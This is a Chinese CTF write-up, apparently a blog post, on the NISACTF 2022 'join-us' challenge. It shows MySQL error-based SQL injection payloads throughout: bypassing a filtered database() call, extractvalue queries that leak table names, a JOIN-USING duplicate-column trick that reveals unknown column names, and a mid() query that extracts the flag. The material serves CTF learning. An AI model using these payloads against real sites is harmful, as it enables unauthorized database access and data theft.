# [NISACTF 2022]join-us 无列名注入 过滤database() 报错获取表名 字段名

[mysql注入可报错时爆表名、字段名、库名 – Wupco's Blog](http://www.wupco.cn/?p=4117) 

又是sql注入

来做一些吧 这里我们可以很快就获取注入点



<img src="https://i-blog.csdnimg.cn/blog_migrate/22b097d615c5196a73e78aaa7ae7ff58.png" alt="" style="max-height:242px; box-sizing:content-box;" />


抓包开干



<img src="https://i-blog.csdnimg.cn/blog_migrate/32daf2737f11d80a64652f7fc160f10e.png" alt="" style="max-height:383px; box-sizing:content-box;" />


开fuzz



<img src="https://i-blog.csdnimg.cn/blog_migrate/b1f30670a3fdf4e2d832032c919131be.png" alt="" style="max-height:305px; box-sizing:content-box;" />


过滤很多东西哦 database都过滤了  那么要咋弄啊。。。

## 绕过database()

这里其实我们可以通过报错来实现

```matlab
1'|a()%23
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/91b0a426b658005d866c6a8716e68dfe.png" alt="" style="max-height:406px; box-sizing:content-box;" />


数据库名这不就来了

然后我们就可以开始查了

在fuzz的时候



<img src="https://i-blog.csdnimg.cn/blog_migrate/744699d99dfc01f5fb86ee5cea6d0cf5.png" alt="" style="max-height:132px; box-sizing:content-box;" />


发现extractvalue没有过滤 那么这不就来了 报错注入 启动！



<img src="https://i-blog.csdnimg.cn/blog_migrate/51f117348793e00fc31ef057db2975bd.png" alt="" style="max-height:383px; box-sizing:content-box;" />


开冲

```cobol
1'||extractvalue(1,0x7e)#

报表

1'||extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema like 'sqlsql')))#
 
XPATH syntax error: '~Fal_flag,output'
 
 
1'||extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name like 'sqlsql')))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/33445ab808e01702395835ba0a73730c.png" alt="" style="max-height:398px; box-sizing:content-box;" />


捏妈 裂开 才启动一下就停止了

起码得到表了

现在我们就要想如何获取字段呢

现在就是开头那篇文章的用法了

介绍一下吧

```cobol
select * from (SELECT * from admin a JOIN admin b)as c
```

这里就会爆出 第一个字段

<img src="https://i-blog.csdnimg.cn/blog_migrate/08dd1d2b33e8b34719c9e718b3f09571.png" alt="" style="max-height:125px; box-sizing:content-box;" />


然后通过using 指定id 就可以爆出下一个



<img src="https://i-blog.csdnimg.cn/blog_migrate/4f9f64542ea1457f322c4c4d627bccf7.png" alt="" style="max-height:619px; box-sizing:content-box;" />


这样这道题不是就简单了

```cobol
tt=1'||extractvalue(1,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b using(id,data)) c)))#

Duplicate column name 'i_tell_u_this_is_Fal(se)_flag_is_in_another'

发现不是这个

那么就去爆另一个吧


tt=1'||extractvalue(1,concat(0x7e,(select * from (select * from output a join output b using(data)) c)))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5cb18c8df8dff1c2bc0aa88b1e39c06b.png" alt="" style="max-height:375px; box-sizing:content-box;" />


出来了耶 然后我们正常mid截取即可

```lisp
tt=1'||extractvalue(1,concat(0x7e,mid((select data from output),1,30)))#
```

这里学到了很多耶 报错什么的